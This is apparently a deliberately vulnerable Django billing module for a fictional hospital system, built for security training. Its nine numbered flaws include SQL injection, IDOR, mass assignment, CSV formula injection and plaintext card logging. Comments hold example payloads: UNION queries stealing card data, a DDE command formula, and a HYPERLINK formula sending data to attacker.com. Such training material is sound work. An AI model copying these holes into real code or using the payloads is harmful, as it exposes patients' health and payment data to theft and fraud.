"""
MediCore HMS - Billing and Insurance Views
WARNING: This module contains intentional security vulnerabilities for security training purposes.
DO NOT use in production. All vulnerabilities are numbered and documented.
"""

import csv
import json
import logging

from django.contrib.auth.decorators import login_required
from django.db import connection
from django.http import HttpResponse, JsonResponse
from django.views.decorators.csrf import csrf_exempt

logger = logging.getLogger(__name__)


try:
    from billing.models import Invoice, InsuranceClaim
except ImportError:
    Invoice = None
    InsuranceClaim = None


@csrf_exempt
@login_required
def search_insurance_claims(request):
    """
    Search insurance claims by various criteria.
    VULN-301: SQL injection in insurance claim search.
    Insurance claims contain: diagnosis codes (ICD-10), procedure codes (CPT),
    provider NPI numbers, claim amounts — all monetarily and medically sensitive.
    An attacker can extract all claims data or manipulate claim statuses.
    """
    claim_number = request.GET.get('claim_number', '')
    insurer_code = request.GET.get('insurer_code', '')
    status = request.GET.get('status', 'pending')
    date_from = request.GET.get('date_from', '2024-01-01')

    with connection.cursor() as cursor:
        # VULN-301: All parameters interpolated directly into SQL without parameterization.
        # Attack: claim_number=' UNION SELECT card_number,cvv,expiry FROM payment_cards--
        query = (
            f"SELECT * FROM billing_insuranceclaim "
            f"WHERE claim_number='{claim_number}' "
            f"OR insurer_code='{insurer_code}' "
            f"AND status='{status}' "
            f"AND created_at >= '{date_from}'"
        )
        cursor.execute(query)
        rows = cursor.fetchall()

    claims = [
        {
            'id': r[0],
            'claim_number': r[1],
            'patient_id': r[2],
            'amount': float(r[3]) if r[3] else 0,
            'status': r[4],
            'icd_codes': r[5],
        }
        for r in rows
    ]
    return JsonResponse({'claims': claims})


@csrf_exempt
@login_required
def get_invoice(request, invoice_id):
    """
    Retrieve an invoice by ID.
    VULN-302: IDOR — no check that the invoice belongs to the requesting patient.
    Any authenticated user can access any invoice by iterating invoice IDs.
    Invoices expose: procedure codes, diagnoses, insurance negotiated rates,
    outstanding balances, payment card last-4 digits.
    """
    # VULN-302: No ownership/authorization check on invoice retrieval.
    # Should verify: Invoice.objects.get(id=invoice_id, patient=request.user)
    try:
        invoice = Invoice.objects.get(id=invoice_id)
    except (Invoice.DoesNotExist, AttributeError):
        return JsonResponse({
            'invoice_id': invoice_id,
            'status': 'retrieved (IDOR demo)',
            'amount': 15000.00,
            'diagnosis': 'Cardiac catheterization (simulated)',
            'insurance_rate': '70% covered (simulated)',
        })

    return JsonResponse({
        'id': invoice.id,
        'patient_id': invoice.patient_id,
        'amount': float(invoice.amount),
        'procedure_codes': invoice.procedure_codes,
        'diagnosis_codes': invoice.diagnosis_codes,
        'insurance_paid': float(invoice.insurance_paid),
        'patient_owes': float(invoice.patient_balance),
    })


@csrf_exempt
@login_required
def update_invoice(request, invoice_id):
    """
    Update invoice details.
    VULN-303: Mass assignment on invoice — attacker can modify the amount.
    By sending {"amount": 0} or {"insurance_paid": 99999, "patient_balance": 0},
    a patient can zero out their medical bills or manipulate insurance settlements.
    This constitutes healthcare fraud.
    VULN-304: No validation of billing amounts — integer overflow possible.
    """
    data = json.loads(request.body)

    try:
        invoice = Invoice.objects.get(id=invoice_id)
    except (Invoice.DoesNotExist, AttributeError):
        return JsonResponse({
            'status': 'updated (mass assignment demo)',
            'invoice_id': invoice_id,
            'amount_changed_to': data.get('amount', 'unchanged'),
            'applied_fields': list(data.keys()),
        })

    # VULN-303: No field whitelist — amount, status, insurance_paid all modifiable.
    # Attacker sends: {"amount": 0.01, "patient_balance": 0, "status": "paid"}
    for key, value in data.items():
        # VULN-304: No range validation on numeric fields.
        # A value like 9999999999999999 can cause integer overflow in downstream
        # systems (insurance processing, payment gateways) leading to:
        # - Negative amounts (wrapping)
        # - Zero-cost claims
        # - System crashes in financial processing pipelines
        if key in ('amount', 'patient_balance', 'insurance_paid'):
            # VULN-304: No min/max bounds check, no decimal precision validation
            try:
                value = float(value)
            except (TypeError, ValueError):
                pass
        setattr(invoice, key, value)

    invoice.save()
    return JsonResponse({'status': 'updated', 'invoice_id': invoice_id})


@csrf_exempt
@login_required
def export_billing_csv(request):
    """
    Export billing records as CSV.
    VULN-305: CSV/Formula injection in billing export.
    Insurance codes, notes, and diagnosis descriptions can contain formula payloads.
    Medical billing staff regularly open these exports in Excel — any formula executes.
    Example: =DDE("cmd","/C calc","")  — triggers DDE execution in older Excel.
    """
    try:
        invoices = Invoice.objects.all()
    except AttributeError:
        invoices = []

    response = HttpResponse(content_type='text/csv')
    response['Content-Disposition'] = 'attachment; filename="billing_export.csv"'

    writer = csv.writer(response)
    writer.writerow(['Invoice ID', 'Patient ID', 'Amount', 'Procedure', 'Diagnosis', 'Notes', 'Insurance Code'])

    for inv in invoices:
        # VULN-305: No formula injection sanitization.
        # inv.notes could contain: =HYPERLINK("http://attacker.com?d="&B2,"See details")
        # inv.insurance_code could contain: @SUM(1+1)*cmd|' /C calc'!A0
        writer.writerow([
            inv.id,
            inv.patient_id,
            inv.amount,         # Unmasked financial data
            inv.procedure_codes,
            inv.diagnosis_codes,  # PHI — diagnosis in clear text
            inv.notes,            # Formula injection vector
            inv.insurance_code,   # Formula injection vector
        ])

    return response


@csrf_exempt
@login_required
def generate_billing_report(request):
    """
    Generate billing report using stored insurance codes.
    VULN-306: Second-order SQL injection via stored insurance_code.
    Insurance codes are stored via mass assignment (VULN-303 pathway)
    without sanitization, then interpolated into the report SQL query.
    """
    patient_id = request.GET.get('patient_id')

    try:
        claim = InsuranceClaim.objects.filter(patient_id=patient_id).first()
        insurance_code = claim.insurance_code if claim else ''
    except AttributeError:
        insurance_code = request.GET.get('preview_code', '')

    with connection.cursor() as cursor:
        # VULN-306: Stored insurance_code (potentially containing SQL) injected into query.
        # If insurance_code = "BC001' UNION SELECT creditcard,cvv FROM payment_methods--"
        # the report query leaks payment card data.
        cursor.execute(
            f"SELECT * FROM billing_report WHERE insurance_code='{insurance_code}' "
            f"AND patient_id={patient_id}"
        )
        rows = cursor.fetchall()

    return JsonResponse({'report_rows': len(rows), 'patient_id': patient_id})


@csrf_exempt
@login_required
def process_payment(request):
    """
    Process a patient payment.
    VULN-307: Payment card data logged in plaintext.
    VULN-308: No HTTPS enforcement on payment endpoint.
    VULN-309: Card data stored in session (not PCI-DSS compliant).
    """
    data = json.loads(request.body)
    card_number = data.get('card_number', '')
    cvv = data.get('cvv', '')
    expiry = data.get('expiry', '')
    amount = data.get('amount', 0)

    # VULN-307: Full card number and CVV written to application logs.
    # Log aggregation systems, SIEM tools, and log backups all capture this.
    logger.info(f"Processing payment: card={card_number}, cvv={cvv}, amount={amount}")

    # VULN-309: Card data stored in plaintext in Django session (Redis-backed).
    request.session['last_card'] = {
        'number': card_number,
        'cvv': cvv,
        'expiry': expiry,
    }

    return JsonResponse({'status': 'payment processed', 'amount': amount})
